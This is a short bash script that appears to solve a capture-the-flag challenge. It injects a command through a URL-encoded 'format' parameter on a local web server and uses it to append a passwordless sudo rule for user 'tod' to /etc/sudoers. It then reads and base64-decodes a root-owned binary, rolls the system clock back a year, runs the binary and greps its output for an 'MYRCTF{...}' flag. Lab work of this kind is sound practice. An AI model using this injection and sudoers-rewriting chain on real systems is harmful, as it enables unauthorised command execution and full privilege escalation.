#!/bin/bash

IP=localhost
PORT=80

function run() {
    PAYLOAD="/home/tod/tools/time /bin/bash -p -c '$@'"
    URLENCODED_PAYLOAD=$(echo "$PAYLOAD" | urlencode)
    curl -s "http://$IP:$PORT/index.html?format=%2B%25R%3B%0A$URLENCODED_PAYLOAD" | tail -n +10 | head -n -6
}

run 'echo "tod ALL=NOPASSWD:ALL" >> /etc/sudoers'
run "sudo cat /root/generateCert | base64" | head -n -2 | base64 -d > myBinary
chmod +x myBinary
sudo timedatectl set-time "$(date --date='1 year ago' +"%F %T")"
./myBinary | grep -Po "MYRCTF\{.*\}"
sudo timedatectl set-time "$(date --date='1 year' +"%F %T")"
rm myBinary
